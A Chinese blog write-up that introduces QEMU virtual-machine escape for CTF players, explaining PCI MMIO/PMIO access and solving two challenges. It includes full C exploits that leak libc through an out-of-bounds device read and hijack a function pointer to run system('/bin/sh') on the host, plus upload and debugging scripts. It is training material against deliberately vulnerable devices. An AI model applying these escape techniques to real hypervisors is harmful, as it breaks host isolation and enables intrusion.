---
title: '[VMPwn] 老头初探 QEMU 逃逸'
description: '"我为什么不会虚拟机逃逸？" 走在路上突然想起这个事情，突然想起前人曾经说过的一句话："不会虚拟机逃逸的人是失败的"。'
pubDate: 2025-05-06
updatedDate: 2025-05-12
authors:
- nova
---

"我为什么不会虚拟机逃逸？" 走在路上突然想起这个事情，突然想起前人曾经说过的一句话："不会虚拟机逃逸的人是失败的"。

但是虚拟机逃逸分为很多种，我们先来个最 pwn 的，qemu escape。

<!--truncate-->

## Pre-requirement

抛开现实不谈，我们先来看看一般比赛里的题型是什么样子的。

正如（绝大多数）用户态 PWN 是提供一个有漏洞的用户态程序一样，内核 PWN 会提供一个有漏洞的内核态程序（通常是驱动），虚拟机 PWN 自然也需要有这么一个目标。

用户态 PWN，一般情况下是通过这个漏洞程序实现 RCE 或是任意文件读，内核 PWN 则是在提供普通用户权限的情况下实现 LPE 或是越权读写。

那么对于 QEMU PWN 来说，一般情况下我们会被提供一个有漏洞的 PCI 设备（它们会和 qemu 本体一起被编译到 qemu-system-x86_64 二进制文件里），最终实现从虚拟机访问宿主机的内存 / 执行命令。

### 什么是 PCI 设备

问得好，简单来说~~符合 PCI 的设备就是 PCI 设备~~ PCI 设备就是符合 Peripheral Component Interconnect （外围设备互联）接口标准的，接在计算机硬件层面的 PCI 总线上的设备，常见的就是那些网卡、声卡、显卡之类的。

那么知道这个有什么用呢？没啥用，因为我们都是模拟的 PCI 设备。

不过 PCI 设备它连上系统， 就会有对应的配置空间。它记录关于此设备的详细信息，例如头部的类型，设备的总类，制造商之类的。但是对于我们最关键的，还是用于表明它的信息。

```bash
> lspci
2f79:00:00.0 3D controller: Microsoft Corporation Basic Render Driver
50eb:00:00.0 System peripheral: Red Hat, Inc. Virtio file system (rev 01)
5582:00:00.0 SCSI storage controller: Red Hat, Inc. Virtio 1.0 console (rev 01)
75ce:00:00.0 3D controller: Microsoft Corporation Basic Render Driver
8ffe:00:00.0 3D controller: Microsoft Corporation Device 008a
```

`xx:yy:z`的格式为`总线:设备:功能`的格式。

```bash
❯ sudo lspci -v -x
2f79:00:00.0 3D controller: Microsoft Corporation Basic Render Driver
        Physical Slot: 3443338332
        Flags: bus master, fast devsel, latency 0
        Capabilities: [40] Null
        Kernel driver in use: dxgkrnl
00: 14 14 8e 00 07 00 10 00 00 00 02 03 00 00 00 00
10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
30: 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00

50eb:00:00.0 System peripheral: Red Hat, Inc. Virtio file system (rev 01)
        Subsystem: Red Hat, Inc. Device 0040
        Physical Slot: 3388996451
        Flags: bus master, fast devsel, latency 64
        Memory at e00000000 (64-bit, non-prefetchable) [size=4K]
        Memory at e00001000 (64-bit, non-prefetchable) [size=4K]
        Memory at c00000000 (64-bit, non-prefetchable) [size=8G]
        Capabilities: [40] MSI-X: Enable+ Count=64 Masked-
        Capabilities: [4c] Vendor Specific Information: VirtIO: CommonCfg
        Capabilities: [5c] Vendor Specific Information: VirtIO: Notify
        Capabilities: [70] Vendor Specific Information: VirtIO: ISR
        Capabilities: [80] Vendor Specific Information: VirtIO: DeviceCfg
        Capabilities: [90] Vendor Specific Information: VirtIO: <unknown>
        Kernel driver in use: virtio-pci
00: f4 1a 5a 10 06 04 10 00 01 00 80 08 00 40 00 00
10: 04 00 00 00 0e 00 00 00 04 10 00 00 0e 00 00 00
20: 04 00 00 00 0c 00 00 00 00 00 00 00 f4 1a 40 00
30: 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00

5582:00:00.0 SCSI storage controller: Red Hat, Inc. Virtio 1.0 console (rev 01)
        Subsystem: Red Hat, Inc. Device 0040
        Physical Slot: 3300344309
        Flags: bus master, fast devsel, latency 64
        Memory at 9ffe00000 (64-bit, non-prefetchable) [size=4K]
        Memory at 9ffe01000 (64-bit, non-prefetchable) [size=4K]
        Memory at 9ffe02000 (64-bit, non-prefetchable) [size=4K]
        Capabilities: [40] MSI-X: Enable+ Count=65 Masked-
        Capabilities: [4c] Vendor Specific Information: VirtIO: CommonCfg
        Capabilities: [5c] Vendor Specific Information: VirtIO: Notify
        Capabilities: [70] Vendor Specific Information: VirtIO: ISR
        Capabilities: [80] Vendor Specific Information: VirtIO: <unknown>
        Capabilities: [94] Vendor Specific Information: VirtIO: DeviceCfg
        Kernel driver in use: virtio-pci
00: f4 1a 43 10 06 04 10 00 01 00 00 01 00 40 00 00
10: 04 00 e0 ff 09 00 00 00 04 10 e0 ff 09 00 00 00
20: 04 20 e0 ff 09 00 00 00 00 00 00 00 f4 1a 40 00
30: 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00

75ce:00:00.0 3D controller: Microsoft Corporation Basic Render Driver
        Physical Slot: 1749427721
        Flags: bus master, fast devsel, latency 0
        Capabilities: [40] Null
        Kernel driver in use: dxgkrnl
00: 14 14 8e 00 07 00 10 00 00 00 02 03 00 00 00 00
10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
30: 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00

8ffe:00:00.0 3D controller: Microsoft Corporation Device 008a
        Physical Slot: 1406519205
        Flags: bus master, fast devsel, latency 0
        Capabilities: [40] Null
        Kernel driver in use: dxgkrnl
00: 14 14 8a 00 07 00 10 00 00 00 02 03 00 00 00 00
10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
30: 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00
```

```bash
# lspci
00:01.0 Class 0601: 8086:7000
00:04.0 Class 00ff: 1234:1337
00:00.0 Class 0600: 8086:1237
00:01.3 Class 0680: 8086:7113
00:03.0 Class 0200: 8086:100e
00:01.1 Class 0101: 8086:7010
00:02.0 Class 0300: 1234:1111
```



以 `00:05.0 Class 00ff: 1234:dead`为例，来介绍每个部分含义，从左向右具体内容指代如下:

- `00`代表总线标号
- `05.0`，其中`05`代表设备号，`.0`用来表示功能号
- `00ff`，class_id
- `1234`，vendor_id
- `dead`，device_id

其中在 0x10 字节之后，保存了一个 Base Address Registers，BAR 记录了设备所需要的地址空间的类型，基址以及其他属性。值得注意的是，当它最后一位是 0 的时候，表示它是映射的 I/O 内存（MMIO）；当它最后一位是 1 的时候，表示它是端口映射的 I/O 内存（PMIO）。

#### MMIO

当它是 MMIO 类型的时候，由第二位决定地址的类型（32 位 / 64 位）。第三位则代表是不是大区间（> 1M）。第四位则表示是不是可预取（Prefetchable）。

在 MMIO 的情况下，我们可以直接用普通的访存指令去访问设备 I/O。

在 MMIO 中，内存和 I/O 设备共享同一个地址空间。

我们可以用看看它的内存空间。它位于 `sys/devices/pci~/~` 下面，其中，resource0 对应 MMIO 空间，resource1 对应 PMIO 空间

 start-address / end-address / flags 

```bash
/sys/devices/pci0000:00/0000:00:03.0 # cat resource
0x00000000febc0000 0x00000000febdffff 0x0000000000040200
0x000000000000c000 0x000000000000c03f 0x0000000000040101
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x00000000feb80000 0x00000000febbffff 0x0000000000046200
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
```



![image-20250501230916132](https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505041433070.png)

```c title="kernel mmio"
#include <linux/io.h>
#include <linux/ioport.h>

void __iomem *addr;
unsigned int val;

// 1. 申请资源
if (!request_mem_region(ioaddr, iomemsize, "my_device")) {
    return -EBUSY;  // 资源已被占用
}

// 2. 映射物理地址
addr = ioremap(ioaddr, iomemsize);
if (!addr) {
    release_mem_region(ioaddr, iomemsize);
    return -ENOMEM;
}

// 3. 读写操作
val = readl(addr);          // 读取 32 位
writel(val + 1, addr);      // 写入 32 位

// 4. 清理
iounmap(addr);
release_mem_region(ioaddr, iomemsize);
```

在 kernel 下面，我们可以直接写。在用户态里，就要通过 resource0 来访问 MMIO

```c title="userspace mmio"
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include<sys/io.h>
unsigned char* mmio_mem;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *((uint32_t*)(mmio_mem + addr));
}

int main(int argc, char *argv[])
{

    // Open and map I/O memory for the strng device
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    printf("mmio_mem @ %p\n", mmio_mem);

    mmio_read(0x1f0000);
    mmio_write(0x128, 1337);

}
```





#### PMIO

如果是 PMIO 的话，就需要用 IN/OUT 之类的指令来访问 I/O 端口。

I/O 设备有一个与内存不同的地址空间，为了实现地址空间的隔离，要么在CPU物理接口上增加一个I/O引脚，要么增加一条专用的I/O总线。

```c title="pcio"
#include <sys/io.h>
uint32_t pmio_base = 0xc050;

uint32_t pmio_write(uint32_t addr, uint32_t value)
{
    outl(value,addr);
}

uint32_t pmio_read(uint32_t addr)
{
    return (uint32_t)inl(addr);
}

int main(int argc, char *argv[])
{

    // Open and map I/O memory for the strng device
    if (iopl(3) !=0 )
        die("I/O permission is not enough");
        pmio_write(pmio_base+0,0);
    pmio_write(pmio_base+4,1);

}
```

## Stage0: Rev & EXP - VNCTF2023 / escape_langlang_mountain

> 附件地址：https://pan.baidu.com/s/1uzVQqcwx3Qp0hb2_JL-_Eg 提取码：muco

> https://buuoj.cn/match/matches/179/challenges#escape_langlang_mountain

这个基本上就看你会不会 mmio 交互，我们先来看看这种。

这种题基本上都会起一个 docker，还是比较复杂，不过我们就按照 README 里搭一个，具体就不说了。



我们首先观察它的 qemu 命令，可以发现它起了一个 device vn,id=vda

那么 vn 自然就是我们的漏洞 pci 设备。

```bash
❯ cat bin/launch.sh
#!/bin/sh
./qemu-system-x86_64 \
    -m 64M --nographic \
    -initrd ./rootfs.cpio \
    -nographic \
    -kernel ./vmlinuz-5.0.5-generic \
    -L pc-bios/ \
    -append "console=ttyS0 root=/dev/ram oops=panic panic=1" \
    -monitor /dev/null \
    -device vn,id=vda
```

所以我们把 qemu 拖进去看看。这题恶心的地方在于它删了符号表，我们从 strings 入手来看，通过搜索 vn_ 找到起始位置。

![image-20250507023938705](https://cdn.nova.gal/img/image-20250507023938705.png)

![image-20250507024051221](https://cdn.nova.gal/img/image-20250507024051221.png)

可以想到这就是一个注册函数，但是具体这些是啥呢？我们可以找一个没被干掉符号表的来看看。

```c
void __fastcall hitb_class_init(ObjectClass_0 *a1, void *data)
{
  PCIDeviceClass *v2; // rax

  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(
                           a1,
                           (const char *)&stru_64A230.bulk_in_pending[2].data[72],
                           (const char *)&stru_5AB2C8.msi_vectors,
                           469,
                           "hitb_class_init");
  v2->revision = 16;
  v2->class_id = 255;
  v2->realize = pci_hitb_realize;
  v2->exit = pci_hitb_uninit;
  v2->vendor_id = 4660;
  v2->device_id = 0x2333;
}
```

我们很容易猜到这个 sub_6D9166 就是一个 realize 函数指针（或者可以恢复一下 qemu 的符号表，然后把它丢个结构体 `PCIDeviceClass` 来看）

![image-20250507024657578](https://cdn.nova.gal/img/image-20250507024657578.png)

进入到 realize，我们继续对比。

```c
void __fastcall pci_hitb_realize(HitbState *pdev, Error_0 **errp)
{
  pdev->pdev.config[61] = 1;
  if ( !msi_init(&pdev->pdev, 0, 1u, 1, 0, errp) )
  {
    timer_init_tl(&pdev->dma_timer, main_loop_tlg.tl[1], 1000000, (QEMUTimerCB *)hitb_dma_timer, pdev);
    qemu_mutex_init(&pdev->thr_mutex);
    qemu_cond_init(&pdev->thr_cond);
    qemu_thread_create(&pdev->thread, (const char *)&stru_5AB2C8.not_legacy_32bit + 12, hitb_fact_thread, pdev, 0);
    memory_region_init_io(&pdev->mmio, &pdev->pdev.qdev.parent_obj, &hitb_mmio_ops, pdev, "hitb-mmio", 0x100000uLL);
    pci_register_bar(&pdev->pdev, 0, 0, &pdev->mmio);
  }
}
```

经验之谈。我们看到这个参数个数和字符串，可以猜测 `sub_54abb5` 就是 `memory_region_init_io` 函数。那么对应的，`off_b83e00` 就是它的 ops，我们显然可以点进去看看它的函数指针在哪，从而找到对应的 read 和 write 函数。



对于 read 函数，我们很容易解析。首先 a1 肯定是结构体的指针我们不管，a2 则是我们读的地址（通过观察其他的 qemu pci 设备，或者对 read 的经验来说），其实还有应该一个 a3 用于表示大小，但是他没写，可能不需要吧）

![image-20250507025258616](https://cdn.nova.gal/img/image-20250507025258616.png)

很简单，让我们读的地址的 `>> 20 & 0xf = 1`，`>> 16 & 0xf = 0xf` 即可把 vnctf 拷贝到一个地址上



对于 write 函数，这个也是很简单了。我们显然要在 read 操作完之后 write 两次，第一次让 `a2 >> 20 & 0xf = 1`，第二次再让 `a2 >> 20 & 0xf = 2，a2 >> 16 & 0xf == 0xf`，就能执行 `system("cat flag")`

![image-20250507025803578](https://cdn.nova.gal/img/image-20250507025803578.png)



对于 exp，我们先把模板搬过来，然后看看它的写法。

```c
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include<sys/io.h>
unsigned char* mmio_mem;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *((uint32_t*)(mmio_mem + addr));
}

int main(int argc, char *argv[])
{

    // Open and map I/O memory for the strng device
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    printf("mmio_mem @ %p\n", mmio_mem);

    mmio_read(0x100);
    mmio_write(0x100, 1337);
}
```

首先既然是 `MMIO`，都叫内存映射了，自然就是要把它打开然后 mmap 过来。

我们读取它的 resource0 文件，因为刚才提到这是它的 MMIO 内存。之后，把它通过 mmap 映射到我们的虚拟地址 `mmio_mem` 上，之后我们对这个 `mmio_mem + offset` 的操作，自然也就会触发刚才的两个 `ops` 回调，并且地址就是我们的 `offset`

好的，那么这个 open 的地址怎么找呢？

```bash
/ # lspci
lspci
00:01.0 Class 0601: 8086:7000
00:04.0 Class 00ff: 0420:1337
00:00.0 Class 0600: 8086:1237
00:01.3 Class 0680: 8086:7113
00:03.0 Class 0200: 8086:100e
00:01.1 Class 0101: 8086:7010
00:02.0 Class 0300: 1234:1111
```

然后和一开始的 `init` 函数对比，可以发现是 `00:04.0` 这个。

那我们就对着改就完事了。



之后我们编译然后上传。

### exp

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
unsigned char* mmio_mem;
void die(const char* msg)
{
  perror(msg);
  exit(-1);
}
uint64_t mmio_read(uint64_t addr)
{
  return *((uint64_t *)(mmio_mem + addr));
}
void mmio_write(uint64_t addr, uint64_t value)
{
  *((uint64_t *)(mmio_mem + addr)) = value;
}
int main()
{
  int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR
| O_SYNC);
  if (mmio_fd == -1)
    die("mmio_fd open failed");
  mmio_mem = mmap(0, 0x1000000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd,
0);
  if (mmio_mem == MAP_FAILED)
    die("mmap mmio_mem failed");
  mmio_read(0x1f0000);
  mmio_write(0x100000, 1);
  mmio_write(0x2f0000, 1);
 
  return 0;
}
```

记得这里 mmap 要开大一点



我们上传脚本这么写

```python
from pwn import *
import time, os

# p = process('./run.sh')
r = remote("localhost", 9999)
output_name = './exp'

# musl-gcc -w -s -static -o3 exp.c -o exp


# p = process(['./qemu-system-x86_64', '-m', '512M', '-kernel', './vmlinuz', '-initrd', './core.cpio', '-L', 'pc-bios', '-monitor', '/dev/null', '-append', "root=/dev/ram rdinit=/sbin/init console=ttyS0 oops=panic panic=1 loglevel=3 quiet kaslr", '-cpu', 'kvm64,+smep', '-smp', 'cores=2,threads=1', '-device', 'ccb-dev-pci', '-nographic'])
os.system("tar -czvf exp.tar.gz ./exp")
os.system("base64 exp.tar.gz > b64_exp")

def exec_cmd(cmd: bytes):
    r.sendline(cmd)
    r.recvuntil(b"/ # ")

def upload():
    p = log.progress("Uploading...")

    with open(output_name, "rb") as f:
        data = f.read()

    encoded = base64.b64encode(data)

    r.recvuntil(b"/ # ")

    for i in range(0, len(encoded), 500):
        p.status("%d / %d" % (i, len(encoded)))
        exec_cmd(b"echo \"%s\" >> benc" % (encoded[i:i+500]))

    exec_cmd(b"cat benc | base64 -d > bout")
    exec_cmd(b"chmod +x bout")

    p.success()
upload()
context.log_level='debug'
# r.sendlineafter("/ #", "./bout")
r.interactive()

```

## Stage1: Simple OOB - CCB2025 / ccb-dev

〉 附件地址：队内网盘，估计不会公开，找不到可以找我要）

接下来，我们正式来打一题。

因为是线下断网环境，这次给的是一个 tar，我们也是正常 load 进去，然后用 docker cp 把 qemu-system_x86-64 给它弄出来

我们看一下 start.sh

```bash
root@98f8c96b09be:/home/ctf# cat run.sh 
#!/bin/sh
./qemu-system-x86_64 \
    -m 512M \
    -kernel ./vmlinuz \
    -initrd  ./core.cpio \
    -L pc-bios \
    -monitor /dev/null \
    -append "root=/dev/ram rdinit=/sbin/init console=ttyS0 oops=panic panic=1 loglevel=3 quiet kaslr" \
    -cpu kvm64,+smep \
    -smp cores=2,threads=1 \
    -device ccb-dev-pci \
    -nographic
```

那自然就是找这个 ccb-dev-pci 了。我们 ida 看一眼。

![image-20250509232134631](https://cdn.nova.gal/img/image-20250509232134631.png)



可以看出和刚才那个结构差不多，那么我们就看看它的 mmio_read 和 mmio_write

感觉这个 mmio_read 一眼越界读，不确定，再看看

![image-20250509232646863](https://cdn.nova.gal/img/image-20250509232646863.png)

![image-20250509232746265](https://cdn.nova.gal/img/image-20250509232746265.png)



显然有，然后我们也能改 dev->log_handler，然后任意地址读写。

把 log_handler 改成 system，log_fd 改成 `"/bin/sh"`，感觉就结束了。



接下来感觉就是一些用户态 libc 的东西。~~我们先进它的 docker 把 libc 搞出来方便本地打。~~~~看了一眼发现依赖好像有点多，又要把 cpio 之类的东西拿出来。~~

~~我们利用 `cat /etc/os-release` 看到 docker 是 18.04 的版本，因为没有静态编译的版本，我们把 [nopwndocker](https://github.com/MuelNova/NoPwnDocker) 里的 18.04 的 gdbserver 和依赖拷进去开一个，这里我重新创了个 docker，把 12314 端口开了，其实也很麻烦（不如直接把它依赖拷出来了说是）~~

```bash
 # nopwndocker
 root@ed7131800cc4 /# ldd $(which gdbserver)
        linux-vdso.so.1 (0x00007ffc54da3000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f7dc9d9d000)
        libstdc++.so.6 => /usr/lib/x86_64-linux-gnu/libstdc++.so.6 (0x00007f7dc9a14000)
        libgcc_s.so.1 => /lib/x86_64-linux-gnu/libgcc_s.so.1 (0x00007f7dc97fc000)
        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f7dc95dd000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7dc91ec000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f7dca238000)
        libm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007f7dc8e4e000)
 
 # ccb-dev docker
 $ LD_LIB_LIBRARY=./libs ./gdbserver host:12314 run.sh
 
 
 # host
 gdb-gef --ex "target remote :12314"
```

发现这种方法符号加载有问题，倒闭！



我们还是把它的依赖都拿出来吧 —— 顺手写了一个脚本

```bash
#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <source_file> <destination_directory>"
    exit 1
fi

SOURCE_FILE="$1"
DESTINATION_DIR="$2"

if [ ! -f "$SOURCE_FILE" ]; then
    echo "Error: Source file '$SOURCE_FILE' does not exist."
    exit 1
fi

if [ ! -d "$DESTINATION_DIR" ]; then
    mkdir -p "$DESTINATION_DIR"
fi

ldd "$SOURCE_FILE" 2>/dev/null | awk '
    /=> \// && !/linux-vdso/ { print $3 }
    /^\// && !/linux-vdso/ { print $1 }
' | while read -r DEPENDENCY; do
    if [ -f "$DEPENDENCY" ]; then
        REALPATH=$(realpath "$DEPENDENCY")
        cp -v "$REALPATH" "$DESTINATION_DIR/$(basename "$DEPENDENCY")"
    else
        echo "Warning: Dependency '$DEPENDENCY' not found."
    fi
done
echo "All dependencies copied to '$DESTINATION_DIR'."
```



```bash
root@00516f495748:/home/ctf# ./ldd_copier.bash qemu-system-x86_64 ./my_libs
'/lib/x86_64-linux-gnu/libz.so.1.2.11' -> './my_libs/libz.so.1'
'/usr/lib/x86_64-linux-gnu/libpixman-1.so.0.34.0' -> './my_libs/libpixman-1.so.0'
'/lib/x86_64-linux-gnu/libutil-2.27.so' -> './my_libs/libutil.so.1'
'/usr/lib/x86_64-linux-gnu/libfdt-1.4.5.so' -> './my_libs/libfdt.so.1'
'/usr/lib/x86_64-linux-gnu/libglib-2.0.so.0.5600.4' -> './my_libs/libglib-2.0.so.0'
'/lib/x86_64-linux-gnu/librt-2.27.so' -> './my_libs/librt.so.1'
'/lib/x86_64-linux-gnu/libm-2.27.so' -> './my_libs/libm.so.6'
'/lib/x86_64-linux-gnu/libgcc_s.so.1' -> './my_libs/libgcc_s.so.1'
'/lib/x86_64-linux-gnu/libpthread-2.27.so' -> './my_libs/libpthread.so.0'
'/lib/x86_64-linux-gnu/libc-2.27.so' -> './my_libs/libc.so.6'
'/lib/x86_64-linux-gnu/libpcre.so.3.13.3' -> './my_libs/libpcre.so.3'
All dependencies copied to './my_libs'.
```



然后拷到 [nopwndocker](https://github.com/MuelNova/NoPwnDocker) 里，我们开两个窗口

```bash
# T1
LD_LIBRARY_PATH=./my_libs ./run.sh

# T2
#!/bin/sh
PID=$(ps -a | grep qemu | awk '{print $1}')

if [ -z "$PID" ]; then
    echo "No qemu process found"
    exit 1
fi

gdb -p $PID -x gdbscript
```



可以看到大概是这样的

```bash
index = 0,
  buffer = {0 <repeats 16 times>},
  log_handler = 0x7faa43e0d140 <dprintf>,
  log_fd = 2,
  log_arg = 0,
  log_format = '\000' <repeats 127 times>,
  status = 0
}
pwndbg> p *(CCBPCIDevState *)0x00005642fdea5ee0
```

这里有一个 dprintf 的指针，我们看看能不能拿到它，简单计算一下 offset（每个 uint32），我们用 `0x11` 即可。

```c
mmio_write(0, 0x11);
mmio_read(4);
printf("mmio_read(4) = 0x%x\n", mmio_read(4));

// mmio_read(4) = 0xf4bec140
```

显然拿到了，不过一次拿一个 uint32，所以我们要再往前读一点，然后计算 libc 基址，然后拿到 system 上去，对于 /bin/sh 也是一样，不再赘述。

### exp

```c
#include <sys/io.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sys/types.h>

unsigned char* mmio_mem;
uint32_t pmio_base=0xc010;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr,uint32_t value)
{
    *((uint32_t *)(mmio_mem+addr)) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *((uint32_t*)(mmio_mem+addr));
}

void pmio_write(uint32_t addr,uint32_t value)
{
    outl(value,addr);
}

uint32_t pmio_read(uint32_t addr)
{
    return (uint32_t)(inl(addr));
}

uint32_t pmio_abread(uint32_t offset)
{
    //return the value of (addr >> 2)
    pmio_write(pmio_base+0,offset);
    return pmio_read(pmio_base+4);
}

void pmio_abwrite(uint32_t offset,uint32_t value)
{
    pmio_write(pmio_base+0,offset);
    pmio_write(pmio_base+4,value);
}

int main()
{
// Open and map I/O memory for the strng device
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    printf("mmio_mem @ %p\n", mmio_mem);

    mmio_write(0, 0x11);
    uint64_t libc_base = mmio_read(4);
    mmio_write(0, 0x12);
    libc_base |= ((uint64_t)mmio_read(4)) << 32;
    libc_base -= 0x65140;

    printf("libc_base = 0x%lx\n", libc_base);

    uint64_t system = libc_base + 0x403860;
    uint64_t binsh = libc_base + 0x1b3d88;

    printf("system = 0x%lx\n", system);
    printf("binsh = 0x%lx\n", binsh);

    mmio_write(4, system >> 32);
    mmio_write(0, 0x11);
    mmio_write(4, system & 0xffffffff);

    mmio_write(0, 0x13);
    mmio_write(4, binsh & 0xffffffff);
    mmio_write(0, 0x14);
    mmio_write(4, binsh >> 32);

    mmio_write(0xc, 0);



    
    return 0;
}



```

这里我们已经拿到了 `/bin/sh`，但是出于某种原因没办法交互（管道冲突？），在 docker 中可以正常打

### attachs

这里丢了一些调试的时候用到的脚本

#### ldd_copier.sh

用于从 docker 中一键拉一个 elf 的所有依赖，方便后面用 `LD_LIBRARY_PATH` 指定

```bash
#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <source_file> <destination_directory>"
    exit 1
fi

SOURCE_FILE="$1"
DESTINATION_DIR="$2"

if [ ! -f "$SOURCE_FILE" ]; then
    echo "Error: Source file '$SOURCE_FILE' does not exist."
    exit 1
fi

if [ ! -d "$DESTINATION_DIR" ]; then
    mkdir -p "$DESTINATION_DIR"
fi

ldd "$SOURCE_FILE" 2>/dev/null | awk '
    /=> \// && !/linux-vdso/ { print $3 }
    /^\// && !/linux-vdso/ { print $1 }
' | while read -r DEPENDENCY; do
    if [ -f "$DEPENDENCY" ]; then
        REALPATH=$(realpath "$DEPENDENCY")
        cp -v "$REALPATH" "$DESTINATION_DIR/$(basename "$DEPENDENCY")"
    else
        echo "Warning: Dependency '$DEPENDENCY' not found."
    fi
done
echo "All dependencies copied to '$DESTINATION_DIR'."
```

#### upload.py

用于远程上传

```python
from pwn import *
import time, os

# p = process('./run.sh')
r = remote("localhost", 9999)
output_name = './exp'

# p = process(['./qemu-system-x86_64', '-m', '512M', '-kernel', './vmlinuz', '-initrd', './core.cpio', '-L', 'pc-bios', '-monitor', '/dev/null', '-append', "root=/dev/ram rdinit=/sbin/init console=ttyS0 oops=panic panic=1 loglevel=3 quiet kaslr", '-cpu', 'kvm64,+smep', '-smp', 'cores=2,threads=1', '-device', 'ccb-dev-pci', '-nographic'])
os.system("tar -czvf exp.tar.gz ./exp")
os.system("base64 exp.tar.gz > b64_exp")

def exec_cmd(cmd: bytes):
    r.sendline(cmd)
    r.recvuntil(b"/ # ")

def upload():
    p = log.progress("Uploading...")

    with open(output_name, "rb") as f:
        data = f.read()

    encoded = base64.b64encode(data)

    r.recvuntil(b"/ # ")

    for i in range(0, len(encoded), 500):
        p.status("%d / %d" % (i, len(encoded)))
        exec_cmd(b"echo \"%s\" >> benc" % (encoded[i:i+500]))

    exec_cmd(b"cat benc | base64 -d > bout")
    exec_cmd(b"chmod +x bout")

    p.success()
upload()
context.log_level='debug'
# r.sendlineafter("/ #", "./bout")
r.interactive()
	
```

#### compile.sh

用于编译 + 压缩到 cpio 中，方便本地调试

```bash
#!/bin/sh

musl-gcc -w -s -static -o3 exp.c -o fs/exp
cd fs
compress_fs core.cpio
```

附赠 compress_fs 和 extract_fs

```bash title="extract_fs"
#!/bin/bash

# 默认目标文件夹
folder="fs"

# 解析参数
while [[ "$#" -gt 0 ]]; do
  case $1 in
  -f | --folder)
    folder="$2"
    shift
    ;;
  *)
    cpio_path="$1"
    ;;
  esac
  shift
done

# 检查cpio_path是否提供
if [[ -z "$cpio_path" ]]; then
  echo "Usage: $0 [-f|--folder folder_name] cpio_path"
  exit 1
fi

# 创建目标文件夹
mkdir -p "$folder"

# 将cpio_path拷贝到目标文件夹
cp "$cpio_path" "$folder"

# 获取文件名
cpio_file=$(basename "$cpio_path")

# 进入目标文件夹
cd "$folder" || exit

# 判断文件是否被 gzip 压缩
if file "$cpio_file" | grep -q "gzip compressed"; then
  echo "$cpio_file is gzip compressed, checking extension..."

  # 判断文件名是否带有 .gz 后缀
  if [[ "$cpio_file" != *.gz ]]; then
    mv "$cpio_file" "$cpio_file.gz"
    cpio_file="$cpio_file.gz"
  fi

  echo "Decompressing $cpio_file..."
  gunzip "$cpio_file"
  # 去掉 .gz 后缀，得到解压后的文件名
